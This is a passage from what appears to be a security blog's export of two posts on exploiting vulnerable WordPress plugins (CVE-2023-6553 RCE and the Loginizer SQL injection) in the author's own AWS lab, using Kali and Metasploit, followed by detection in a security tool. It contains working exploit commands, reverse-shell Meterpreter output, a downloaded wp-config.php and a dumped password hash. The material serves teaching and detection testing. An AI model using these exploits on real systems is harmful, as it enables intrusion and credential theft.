vulnerable. [*] Sending the payload, please wait... [*] Sending stage (39927 bytes) to 3.124.173.56 [*] Meterpreter session 2 opened (10.192.10.244:443 -&gt; 3.124.173.56:20234) at 2024-11-23 09:22:26 +0000 [*] Session 2 created in the background. resource (stdin)&gt; sessions --interact 1 --meterpreter-command ps --meterpreter-command sysinfo --meterpreter-command \"download /bitnami/wordpress/wp-config.php\" [*] Running 'ps' on meterpreter session 1 (3.120.120.128) Process List ============ PID Name User Path --- ---- ---- ---- 1 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 309 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 310 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 311 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 312 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 313 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 314 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 316 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 317 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 318 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 319 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 320 sh 1001 sh -c ps ax -w -o pid,user,cmd --no-header 2&gt;/dev/null 321 ps 1001 ps ax -w -o pid,user,cmd --no-header [*] Running 'sysinfo' on meterpreter session 1 (3.120.120.128) Computer : wordpress-5db67cf9bf-z45tq OS : Linux wordpress-5db67cf9bf-z45tq 5.10.227-219.884.amzn2.x86_64 #1 SMP Tue Oct 22 16:38:23 UTC 2024 x86_64 Meterpreter : php/linux [*] Running 'download /bitnami/wordpress/wp-config.php' on meterpreter session 1 (3.120.120.128) [*] Downloading: /bitnami/wordpress/wp-config.php -&gt; /home/kali/wp-config.php [*] Downloaded 4.19 KiB of 4.19 KiB (100.0%): /bitnami/wordpress/wp-config.php -&gt; /home/kali/wp-config.php [*] Completed : /bitnami/wordpress/wp-config.php -&gt; /home/kali/wp-config.php resource (stdin)&gt; use auxiliary/scanner/http/wp_loginizer_log_sqli resource (stdin)&gt; set rhost a8fe9c409fcee4d7bbcbd9cab63193f8-449369653.eu-central-1.elb.amazonaws.com rhost =&gt; a8fe9c409fcee4d7bbcbd9cab63193f8-449369653.eu-central-1.elb.amazonaws.com resource (stdin)&gt; set verbose true verbose =&gt; true resource (stdin)&gt; run [*] Checking /wp-content/plugins/loginizer/readme.txt [*] Found version 1.6.3 in the plugin [+] Vulnerable version of Loginizer detected [*] {SQLi} Executing (select group_concat(qVEWKKc) from (select cast(concat_ws(';',ifnull(user_login,''),ifnull(user_pass,'')) as binary) qVEWKKc from wp_users limit 1) Dbui) [*] {SQLi} Time-based injection: expecting output of length 44 [+] wp_users ======== user_login user_pass ---------- --------- wordpress $P$BMw5qRAPq4/dgegxy/v/jL45GCgc/a0 ... The outputs above indicate that the attack against the WordPress site was successful. We retrieved information about the remote system, including a list of processes, the wp-config.php file, system details, and a list of users with their password hashes. Details in Security tool Explore the Wiz security tool to learn how it can assist in identifying hacker attacks. Wiz Sensor details Let’s look at the Wiz Sensor details in Wiz to ensure everything was properly installed. Wiz -&gt; Settings -&gt; Deployment -&gt; Sensor - Amazon EKS Wiz -&gt; Settings -&gt; Deployment -&gt; Sensor - EC2 Examine the details about the breach The first place to look in Wiz is the “Issues” tab: Wiz -&gt; Issues Wiz -&gt; Issues -&gt; Amazon EKS details Wiz -&gt; Issues -&gt; Amazon EC2 + Docker details Wiz -&gt; Issues -&gt; Amazon EC2 details …or check Cloud Events: Wiz -&gt; Cloud Events If you view the details of the Amazon EKS cluster or the EC2 instances in Wiz, you can also access information about the attack: Wiz -&gt; Amazon EKS issues Wiz -&gt; Amazon EKS events Wiz -&gt; Amazon EKS Wiz -&gt; Amazon EKS -&gt; Issues -&gt; Details -&gt; Investigation Additional breach details can be found in the “Runtime Response Policies” section: Wiz -&gt; Policies -&gt; Runtime Response Policies -&gt; Details Wiz -&gt; Policies -&gt; Runtime Response Policies -&gt; Details Raw I can also review the container image in Wiz to identify any existing vulnerabilities: Wiz -&gt; Container Image details The screenshots above illustrate the detection capabilities of Wiz combined with the Wiz Sensor, enabling security teams to identify system breaches. It’s essential to configure notifications and responses to ensure timely alerts in the event of an attack. Cleanup Delete the Amazon EKS cluster, Kali Linux EC2 instance, EC2 Key Pair, and related CloudFormation stacks: export AWS_DEFAULT_REGION=\"eu-central-1\" export AWS_EC2_KEY_PAIR_NAME=\"wordpress-test\" export SOLUTION_KALI=\"KaliLinux-NICE-DCV\" export SOLUTION_EC2_CONTAINER=\"Amazon-EC2-Container\" export SOLUTION_EC2=\"Amazon-EC2\" export CLUSTER_NAME=\"Amazon-EKS\" export TMP_DIR=\"${TMP_DIR:-${PWD}/tmp}\" export KUBECONFIG=\"${TMP_DIR}/kubeconfig-${CLUSTER_NAME}.conf\" aws cloudformation delete-stack --stack-name \"${SOLUTION_KALI}\" aws cloudformation delete-stack --stack-name \"${SOLUTION_EC2_CONTAINER}\" aws cloudformation delete-stack --stack-name \"${SOLUTION_EC2}\" if eksctl get cluster --name=\"${CLUSTER_NAME}\"; then eksctl delete cluster --name=\"${CLUSTER_NAME}\" --force fi aws cloudformation delete-stack --stack-name \"${SOLUTION_KALI}-VPC\" aws cloudformation delete-stack --stack-name \"${SOLUTION_EC2_CONTAINER}-VPC\" aws cloudformation delete-stack --stack-name \"${SOLUTION_EC2}-VPC\" aws ec2 delete-key-pair --key-name \"${AWS_EC2_KEY_PAIR_NAME}\" for FILE in ${TMP_DIR}/{vpc_cloudformation_template.yml,KaliLinux-NICE-DCV.yaml,AmazonLinux-2023-LAMP-server.yaml,${AWS_EC2_KEY_PAIR_NAME}.pem,helm_values-wordpress.yml,kubeconfig-${CLUSTER_NAME}.conf}; do if [[ -f \"${FILE}\" ]]; then rm -v \"${FILE}\" else echo \"*** File not found: ${FILE}\" fi done Enjoy … 😉" }, { "title": "Exploit vulnerability in a WordPress plugin with Kali Linux 2", "url": "/posts/exploit-vulnerability-wordpress-plugin-kali-linux-2/", "categories": "Cloud, Security, Virtualization", "tags": "ec2, docker, security, exploit, vulnerability, kali-linux, wordpress", "date": "2024-05-09 00:00:00 +0200", "content": "For educational purposes, it can be useful to learn how to exploit Remote Code Execution (RCE) and SQL Injection (SQLi) vulnerabilities in a WordPress plugin using Kali Linux. I will cover the following steps: Install an Amazon ECS cluster and create two EC2 instances (one standalone and one with Docker) Install WordPress and a vulnerable WordPress plugin to ECS, Docker, and a standalone EC2 instance Create an EC2 instance with Kali Linux (and install Metasploit on it) to serve as the attacker machine Exploit vulnerabilities in a WordPress plugin using Kali Linux and Metasploit Set necessary environment variables and download CloudFormation templates Requirements: AWS CLI Colima / Docker / Rancher Desktop / … copilot Set the required environment variables: export AWS_ACCESS_KEY_ID=\"xxxxxxxxxxxxxxxxxx\" export AWS_SECRET_ACCESS_KEY=\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\" export AWS_DEFAULT_REGION=\"eu-central-1\" AWS_EC2_KEY_PAIR_NAME=\"wordpress-test\" TMP_DIR=\"${TMP_DIR:-${PWD}}\" WORDPRESS_USERNAME=\"wordpress\" WORDPRESS_PASSWORD=$(openssl rand -base64 12) MARIADB_WORDPRESS_DATABASE=\"wordpress\" MARIADB_WORDPRESS_DATABASE_USER=\"wordpress\" MARIADB_WORDPRESS_DATABASE_PASSWORD=$(openssl rand -base64 12) MARIADB_ROOT_PASSWORD=$(openssl rand -base64 12) Download the CloudFormation templates for the VPC, Kali Linux, Ubuntu (Docker EC2), and AmazonLinux-2023 (standalone EC2) instances: # renovate: currentValue=master wget --continue -q -P \"${TMP_DIR}\" https://raw.githubusercontent.com/aws-samples/aws-codebuild-samples/00284b828a360aa89ac635a44d84c5a748af03d3/ci_tools/vpc_cloudformation_template.yml # renovate: wget --continue -q -P \"${TMP_DIR}\" https://raw.githubusercontent.com/aws-samples/amazon-ec2-nice-dcv-samples/3cb54467cf4c58bace2f949a704871f9bc0e5af5/cfn/KaliLinux-NICE-DCV.yaml # renovate: wget --continue -q -P \"${TMP_DIR}\" https://raw.githubusercontent.com/aws-samples/ec2-lamp-server/c0ec2481d4995771422304b05b7b90bd701052f2/UbuntuLinux-2204-LAMP-server.yaml # renovate: wget --continue -q -P \"${TMP_DIR}\" https://raw.githubusercontent.com/aws-samples/ec2-lamp-server/c0ec2481d4995771422304b05b7b90bd701052f2/AmazonLinux-2023-LAMP-server.yaml Create a new AWS EC2 Key Pair to be used for the EC2 instances: aws ec2 create-key-pair --key-name \"${AWS_EC2_KEY_PAIR_NAME}\" --key-type ed25519 --query \"KeyMaterial\" --output text &gt; \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" chmod 600 \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" Run Kali Linux on Amazon EC2 instance Create an AWS EC2 instance with Kali Linux using the CloudFormation template: export SOLUTION_KALI=\"KaliLinux-NICE-DCV\" aws cloudformation deploy --capabilities CAPABILITY_IAM \\ --parameter-overrides \"EnvironmentName=${SOLUTION_KALI}\" \\ --stack-name \"${SOLUTION_KALI}-VPC\" --template-file \"${TMP_DIR}/vpc_cloudformation_template.yml\" \\ --tags \"Owner=${USER} Environment=dev Solution=${SOLUTION_KALI}\" AWS_CLOUDFORMATION_DETAILS=$(aws cloudformation describe-stacks --stack-name \"${SOLUTION_KALI}-VPC\" --query \"Stacks[0].Outputs[? OutputKey==\\`PublicSubnet1\\` || OutputKey==\\`VPC\\`].{OutputKey:OutputKey,OutputValue:OutputValue}\") AWS_VPC_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"VPC\\\") .OutputValue\") AWS_SUBNET_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"PublicSubnet1\\\") .OutputValue\") eval aws cloudformation create-stack --capabilities CAPABILITY_AUTO_EXPAND CAPABILITY_IAM --on-failure DO_NOTHING \\ --parameters \"ParameterKey=ec2KeyPair,ParameterValue=${AWS_EC2_KEY_PAIR_NAME} ParameterKey=vpcID,ParameterValue=${AWS_VPC_ID} ParameterKey=subnetID,ParameterValue=${AWS_SUBNET_ID} ParameterKey=allowWebServerPorts,ParameterValue=HTTP-and-HTTPS\" \\ --stack-name \"${SOLUTION_KALI}\" --template-body \"file://${TMP_DIR}/KaliLinux-NICE-DCV.yaml\" \\ --tags \"Key=Owner,Value=${USER} Key=Environment,Value=dev Key=Solution,Value=${SOLUTION_KALI}\" Build EC2 instances with Wordpress Application Let’s look at how to build an EC2 instance with a vulnerable WordPress application. Create new EC2 instance with Wordpress in Container Build a new Ubuntu Linux 22.04 EC2 instance: export SOLUTION_EC2_CONTAINER=\"Amazon-EC2-Container\" aws cloudformation deploy \\ --parameter-overrides \"EnvironmentName=${SOLUTION_EC2_CONTAINER}\" \\ --stack-name \"${SOLUTION_EC2_CONTAINER}-VPC\" --template-file \"${TMP_DIR}/vpc_cloudformation_template.yml\" \\ --tags \"Owner=${USER} Environment=dev Solution=${SOLUTION_EC2_CONTAINER}\" AWS_CLOUDFORMATION_DETAILS=$(aws cloudformation describe-stacks --stack-name \"${SOLUTION_EC2_CONTAINER}-VPC\" --query \"Stacks[0].Outputs[? OutputKey==\\`PublicSubnet1\\` || OutputKey==\\`VPC\\`].{OutputKey:OutputKey,OutputValue:OutputValue}\") AWS_VPC_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"VPC\\\") .OutputValue\") AWS_SUBNET_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"PublicSubnet1\\\") .OutputValue\") eval aws cloudformation deploy --capabilities CAPABILITY_IAM \\ --parameter-overrides \"instanceType=t4g.medium ec2Name=${SOLUTION_EC2_CONTAINER} ec2KeyPair=${AWS_EC2_KEY_PAIR_NAME} vpcID=${AWS_VPC_ID} subnetID=${AWS_SUBNET_ID} webOption=none databaseOption=none phpVersion=none\" \\ --stack-name \"${SOLUTION_EC2_CONTAINER}\" --template-file \"${TMP_DIR}/AmazonLinux-2023-LAMP-server.yaml\" \\ --tags \"Owner=${USER} Environment=dev Solution=${SOLUTION_EC2_CONTAINER}\" AWS_EC2_CONTAINER_PUBLIC_IP=$(aws ec2 describe-instances --filters \"Name=tag:Solution,Values=${SOLUTION_EC2_CONTAINER}\" --query \"Reservations[].Instances[].PublicIpAddress\" --output text) ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"ec2-user@${AWS_EC2_CONTAINER_PUBLIC_IP}\" 'curl -Ls https://github.com/ruzickap.keys &gt;&gt; ~/.ssh/authorized_keys' Install Docker and Docker Compose on the instance: ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"ec2-user@${AWS_EC2_CONTAINER_PUBLIC_IP}\" &lt;&lt; \\EOF set -euxo pipefail sudo dnf install -qy docker sudo usermod -aG docker ec2-user sudo systemctl enable --now docker sudo mkdir -p /usr/local/lib/docker/cli-plugins sudo curl -sL https://github.com/docker/compose/releases/latest/download/docker-compose-linux-$(uname -m) -o /usr/local/lib/docker/cli-plugins/docker-compose sudo chown root:root /usr/local/lib/docker/cli-plugins/docker-compose sudo chmod +x /usr/local/lib/docker/cli-plugins/docker-compose EOF Install WordPress in a container with the vulnerable WordPress Backup Migration Plugin and Loginizer plugins: # shellcheck disable=SC2087 ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"ec2-user@${AWS_EC2_CONTAINER_PUBLIC_IP}\" &lt;&lt; EOF2 set -euxo pipefail mkdir -p docker-entrypoint-init.d cat &gt; docker-entrypoint-init.d/wordpress_plugin_install.sh &lt;&lt; EOF wp plugin install backup-backup --version=1.3.7 --activate wp plugin install loginizer --version=1.6.3 --activate EOF chmod a+x docker-entrypoint-init.d/wordpress_plugin_install.sh cat &gt; docker-compose.yml &lt;&lt; EOF services: mariadb: # renovate: datasource=docker depName=bitnami/mariadb image: docker.io/bitnami/mariadb:11.2 volumes: - 'mariadb_data:/bitnami/mariadb' environment: - ALLOW_EMPTY_PASSWORD=no - MARIADB_USER=${MARIADB_WORDPRESS_DATABASE_USER} - MARIADB_DATABASE=${MARIADB_WORDPRESS_DATABASE} - MARIADB_PASSWORD=${MARIADB_WORDPRESS_DATABASE_PASSWORD} - MARIADB_ROOT_PASSWORD=${MARIADB_ROOT_PASSWORD} wordpress: image: docker.io/bitnami/wordpress:6 ports: - '80:8080' - '443:8443' volumes: - 'wordpress_data:/bitnami/wordpress' - '\\${PWD}/docker-entrypoint-init.d:/docker-entrypoint-init.d' depends_on: - mariadb environment: - ALLOW_EMPTY_PASSWORD=no - WORDPRESS_USERNAME=${WORDPRESS_USERNAME} - WORDPRESS_PASSWORD=${WORDPRESS_PASSWORD} - WORDPRESS_DATABASE_HOST=mariadb - WORDPRESS_DATABASE_PORT_NUMBER=3306 - WORDPRESS_DATABASE_USER=${MARIADB_WORDPRESS_DATABASE_USER} - WORDPRESS_DATABASE_PASSWORD=${MARIADB_WORDPRESS_DATABASE_PASSWORD} - WORDPRESS_DATABASE_NAME=${MARIADB_WORDPRESS_DATABASE} volumes: mariadb_data: driver: local wordpress_data: driver: local EOF docker compose up --quiet-pull -d EOF2 The vulnerable plugins, WordPress Backup Migration Plugin 1.3.7 and Loginizer 1.6.3, were installed. Summarize the WordPress URL, Admin URL, Username, and Password: echo \"WordPress URL: http://${AWS_EC2_CONTAINER_PUBLIC_IP}/\" echo \"WordPress Admin URL: http://${AWS_EC2_CONTAINER_PUBLIC_IP}/admin\" echo -e \"Username: ${WORDPRESS_USERNAME}\\nPassword: ${WORDPRESS_PASSWORD}\" Create new EC2 instance with Wordpress Build a new Amazon Linux 2023 EC2 instance for a standalone WordPress installation: export SOLUTION_EC2=\"Amazon-EC2\" aws cloudformation deploy \\ --parameter-overrides \"EnvironmentName=${SOLUTION_EC2}\" \\ --stack-name \"${SOLUTION_EC2}-VPC\" --template-file \"${TMP_DIR}/vpc_cloudformation_template.yml\" \\ --tags \"Owner=${USER} Environment=dev Solution=${SOLUTION_EC2}\" AWS_CLOUDFORMATION_DETAILS=$(aws cloudformation describe-stacks --stack-name \"${SOLUTION_EC2}-VPC\" --query \"Stacks[0].Outputs[? OutputKey==\\`PublicSubnet1\\` || OutputKey==\\`VPC\\`].{OutputKey:OutputKey,OutputValue:OutputValue}\") AWS_VPC_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"VPC\\\") .OutputValue\") AWS_SUBNET_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"PublicSubnet1\\\") .OutputValue\") eval aws cloudformation deploy --capabilities CAPABILITY_IAM \\ --parameter-overrides \"instanceType=t4g.medium ec2Name=${SOLUTION_EC2} ec2KeyPair=${AWS_EC2_KEY_PAIR_NAME} vpcID=${AWS_VPC_ID} subnetID=${AWS_SUBNET_ID}\" \\ --stack-name \"${SOLUTION_EC2}\" --template-file \"${TMP_DIR}/AmazonLinux-2023-LAMP-server.yaml\" \\ --tags \"Owner=${USER} Environment=dev Solution=${SOLUTION_EC2}\" AWS_EC2_PUBLIC_IP=$(aws ec2 describe-instances --filters \"Name=tag:Solution,Values=${SOLUTION_EC2}\" --query \"Reservations[].Instances[].PublicIpAddress\" --output text) ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"ec2-user@${AWS_EC2_PUBLIC_IP}\" 'curl -Ls https://github.com/ruzickap.keys &gt;&gt; ~/.ssh/authorized_keys' Configure MariaDB and add a wordpress user with a password: # shellcheck disable=SC2087 ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"ec2-user@${AWS_EC2_PUBLIC_IP}\" &lt;&lt; EOF2 sudo mysql --user=root &lt;&lt; \\EOF UPDATE mysql.global_priv SET priv=json_set(priv, '$.plugin', 'mysql_native_password', '$.authentication_string', PASSWORD('${MARIADB_ROOT_PASSWORD}')) WHERE User='root'; DELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost', '127.0.0.1', '::1'); DELETE FROM mysql.global_priv WHERE User=''; DROP DATABASE IF EXISTS test; DELETE FROM mysql.db WHERE Db='test' OR Db='test\\\\_%'; CREATE USER '${MARIADB_WORDPRESS_DATABASE_USER}'@'localhost' IDENTIFIED BY '${MARIADB_WORDPRESS_DATABASE_PASSWORD}'; GRANT ALL PRIVILEGES ON ${MARIADB_WORDPRESS_DATABASE}.* TO '${MARIADB_WORDPRESS_DATABASE_USER}'@'localhost'; FLUSH PRIVILEGES; EOF EOF2 Install WordPress with the vulnerable WordPress Backup Migration Plugin and Loginizer plugins: # shellcheck disable=SC2087 ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"ec2-user@${AWS_EC2_PUBLIC_IP}\" &lt;&lt; EOF set -euxo pipefail wget -q https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar chmod +x wp-cli.phar sudo mv wp-cli.phar /usr/local/bin/wp cd /var/www/html/ wp core download --version=6.5.3 wp config create --dbname=\"${MARIADB_WORDPRESS_DATABASE}\" --dbuser=\"${MARIADB_WORDPRESS_DATABASE_USER}\" --dbpass=\"${MARIADB_WORDPRESS_DATABASE_PASSWORD}\" wp db create wp core install --url=\"${AWS_EC2_PUBLIC_IP}\" --title=\"My Blog\" --admin_user=\"${WORDPRESS_USERNAME}\" --admin_password=\"${WORDPRESS_PASSWORD}\" --skip-email --admin_email=\"info@example.com\" wp plugin install backup-backup --version=1.3.7 --activate wp plugin install loginizer --version=1.6.3 --activate EOF Summarize the WordPress URL, Admin URL, Username, and Password: echo \"WordPress URL: http://${AWS_EC2_PUBLIC_IP}/\" echo \"WordPress Admin URL: http://${AWS_EC2_PUBLIC_IP}/wp-admin/\" echo -e \"Username: ${WORDPRESS_USERNAME}\\nPassword: ${WORDPRESS_PASSWORD}\" Create ECS cluster with Wordpress Prepare the wordpress_plugin_install.sh startup script. This script will be used to install the vulnerable WordPress Backup Migration Plugin and Loginizer plugins during container startup: cd \"${TMP_DIR}\" || exit cat &gt; wordpress_plugin_install.sh &lt;&lt; EOF wp plugin install backup-backup --version=1.3.7 --activate wp plugin install loginizer --version=1.6.3 --activate EOF chmod a+x wordpress_plugin_install.sh Create the startup.sh script. This script will populate environment variables for the bitnami/wordpress container based on the WORDPRESSCLUSTER_SECRET produced by Copilot: cat &gt; startup.sh &lt;&lt; \\EOF #!/bin/sh # Exit if the secret wasn't populated by the ECS agent if [ -z \"${WORDPRESSCLUSTER_SECRET}\" ]; then echo \"Environment variable \"WORDPRESSCLUSTER_SECRET\" with secrets is not populated in environment !!!\" echo 'It should look like: {\"host\":\"mariadb\",\"port\":3306,\"dbname\":\"wordpress\",\"username\":\"wordpress\",\"password\":\"password\"}' exit 1 fi export WORDPRESS_DATABASE_HOST=$(echo \"${WORDPRESSCLUSTER_SECRET}\" | jq -r '.host') export WORDPRESS_DATABASE_PORT_NUMBER=$(echo \"${WORDPRESSCLUSTER_SECRET}\" | jq -r '.port') export WORDPRESS_DATABASE_NAME=$(echo \"${WORDPRESSCLUSTER_SECRET}\" | jq -r '.dbname') export WORDPRESS_DATABASE_USER=$(echo \"${WORDPRESSCLUSTER_SECRET}\" | jq -r '.username') export WORDPRESS_DATABASE_PASSWORD=$(echo \"${WORDPRESSCLUSTER_SECRET}\" | jq -r '.password') /opt/bitnami/scripts/wordpress/entrypoint.sh /opt/bitnami/scripts/apache/run.sh EOF chmod a+x startup.sh Prepare the Dockerfile. This file defines how to install jq into the Bitnami WordPress image and uses the startup.sh script to start the container: cat &gt; Dockerfile &lt;&lt; \\EOF FROM docker.io/bitnami/minideb:bookworm as installer RUN set -eux &amp;&amp; \\ apt-get update -q &amp;&amp; \\ apt-get install curl -y -q &amp;&amp; \\ curl -sLo /usr/local/bin/jq https://github.com/stedolan/jq/releases/download/jq-1.5/jq-linux64 &amp;&amp; \\ chmod a+x /usr/local/bin/jq FROM docker.io/bitnami/wordpress:latest as app COPY --from=installer /usr/local/bin/jq /usr/bin/jq COPY startup.sh /opt/copilot/scripts/startup.sh COPY wordpress_plugin_install.sh /docker-entrypoint-init.d/ ENTRYPOINT [\"/bin/sh\", \"-c\"] CMD [\"/opt/copilot/scripts/startup.sh\"] EXPOSE 8080 EOF Initialize the backend application with Copilot: copilot app init wordpress --resource-tags \"Owner=${USER},Environment=dev,Solution=Amazon-ECS\" Create a development environment for the application: copilot env init --name dev --default-config Set up the required infrastructure to run our containerized application. Copilot will now proceed to create the VPC, Public Subnets, Private Subnets, a Route53 Private Hosted Zone for service discovery, a custom route table, a Security Group for inter-container communication, and an ECS Cluster to group the ECS services: copilot env deploy --name dev Create WordPress secrets as SecureString parameters in SSM Parameter Store: copilot secret init --name WORDPRESS_USERNAME --values \"dev=${WORDPRESS_USERNAME}\" --overwrite copilot secret init --name WORDPRESS_PASSWORD --values \"dev=${WORDPRESS_PASSWORD}\" --overwrite Start Docker Desktop or Colima if you are a macOS user: colima start Create a manifest file that defines your backend service: copilot svc init --dockerfile Dockerfile \\ --name wordpress --port 8080 --svc-type 'Load Balanced Web Service' Add references to the secrets in copilot/wordpress/manifest.yml: cat &gt;&gt; copilot/wordpress/manifest.yml &lt;&lt; EOF secrets: WORDPRESS_USERNAME: /copilot/wordpress/dev/secrets/WORDPRESS_USERNAME WORDPRESS_PASSWORD: /copilot/wordpress/dev/secrets/WORDPRESS_PASSWORD EOF Create an Aurora DB to be used by the backend service: copilot storage init --name wordpress-cluster --lifecycle=workload \\ --storage-type Aurora --engine MySQL --initial-db \"${MARIADB_WORDPRESS_DATABASE}\" Deploy the backend service: copilot svc deploy --resource-tags \"Owner=${USER},Environment=dev,Solution=Amazon-ECS\" Get the details of the deployed service: COPILOT_PUBLIC_IP=$(copilot svc show --name wordpress --json | jq -r '.routes[].url') copilot svc show --name wordpress About Application wordpress Name wordpress Type Load Balanced Web Service Configurations Environment Tasks CPU (vCPU) Memory (MiB) Platform Port ----------- ----- ---------- ------------ -------- ---- dev 1 0.25 512 LINUX/X86_64 8080 Routes Environment URL ----------- --- dev http://wordpr-Publi-BpPriJDxXb94-436714884.eu-central-1.elb.amazonaws.com Internal Service Endpoints Endpoint Environment Type -------- ----------- ---- wordpress:8080 dev Service Connect wordpress.dev.wordpress.local:8080 dev Service Discovery Variables Name Container Environment Value ---- --------- ----------- ----- COPILOT_APPLICATION_NAME wordpress dev wordpress COPILOT_ENVIRONMENT_NAME \" \" dev COPILOT_LB_DNS \" \" wordpr-Publi-BpPriJDxXb94-436714884.eu-central-1.elb.amazonaws.com COPILOT_SERVICE_DISCOVERY_ENDPOINT \" \" dev.wordpress.local COPILOT_SERVICE_NAME \" \" wordpress WORDPRESSCLUSTER_SECURITY_GROUP \" \" sg-0877803062b02c1ac Secrets Name Container Environment Value From ---- --------- ----------- ---------- WORDPRESSCLUSTER_SECRET wordpress dev arn:aws:secretsmanager:eu-central-1:729560437327:secret:wordpressclusterAuroraSecre-2q9Fj1KRUkQL-VV3pqy WORDPRESS_PASSWORD \" \" parameter//copilot/wordpress/dev/secrets/WORDPRESS_PASSWORD WORDPRESS_USERNAME \" \" parameter//copilot/wordpress/dev/secrets/WORDPRESS_USERNAME Summarize the WordPress URL, Admin URL, Username and Password: echo \"WordPress URL: ${COPILOT_PUBLIC_IP}/\" echo \"WordPress Admin URL: ${COPILOT_PUBLIC_IP}/wp-admin/\" echo -e \"Username: ${WORDPRESS_USERNAME}\\nPassword: ${WORDPRESS_PASSWORD}\" Handy ECS links: Build Efficient CI/CD Pipelines for Connected Microservices in Under an Hour Using AWS Copilot Wordpress on Copilot Attack the Wordpress Application The following part describes using the Metasploit Framework to exploit vulnerabilities in the WordPress Backup Migration Plugin and Loginizer plugins. Details about the WordPress plugin vulnerabilities can be found here: WordPress Backup Migration Plugin WordPress Backup Migration Plugin PHP Filter Chain RCE Vulnerability Details : CVE-2023-6553 CVE-2023-6553 Exploit V2 CVE-2023-6553 Detail Unauth RCE in the WordPress plugin: Backup Migration (&lt;= 1.3.7) Loginizer WordPress Loginizer log SQLi Scanner Vulnerability Details : CVE-2020-27615 CVE-2020-27615 Detail Loginizer timebased SQL injection in versions before 1.6.4 Log in to the Kali Linux instance using SSH and perform the following steps: Use the wp_backup_migration_php_filter and wp_loginizer_log_sqli Metasploit modules to exploit the WordPress plugin vulnerabilities Execute sysinfo to get details about the remote system Download the WordPress config file wp-config.php, which contains database credentials Allow your user to connect to the Kali Linux instance using SSH and then install Metasploit: AWS_EC2_KALI_LINUX_PUBLIC_IP=$(aws ec2 describe-instances --filters \"Name=tag:Solution,Values=${SOLUTION_KALI}\" --query \"Reservations[].Instances[].PublicIpAddress\" --output text) ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"kali@${AWS_EC2_KALI_LINUX_PUBLIC_IP}\" 'curl -Ls https://github.com/ruzickap.keys &gt;&gt; ~/.ssh/authorized_keys' scp -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" \"kali@${AWS_EC2_KALI_LINUX_PUBLIC_IP}\":~ ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"kali@${AWS_EC2_KALI_LINUX_PUBLIC_IP}\" &lt;&lt; EOF touch ~/.hushlogin sudo snap install metasploit-framework msfdb init EOF Metasploit logo Run the Metasploit Framework and exploit the vulnerability in all three environments (ECS, EC2 with Docker, and a standalone EC2 instance): # shellcheck disable=SC2087 for PUBLIC_IP in ${COPILOT_PUBLIC_IP} ${AWS_EC2_CONTAINER_PUBLIC_IP} ${AWS_EC2_PUBLIC_IP}; do echo \"*** ${PUBLIC_IP}\" ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"kali@${AWS_EC2_KALI_LINUX_PUBLIC_IP}\" &lt;&lt; EOF2 cat &lt;&lt; EOF | msfconsole --quiet --resource - use exploit/multi/http/wp_backup_migration_php_filter set rhost ${PUBLIC_IP} set lhost ${AWS_EC2_KALI_LINUX_PUBLIC_IP} set lport 443 run --no-interact sessions --interact 1 --meterpreter-command 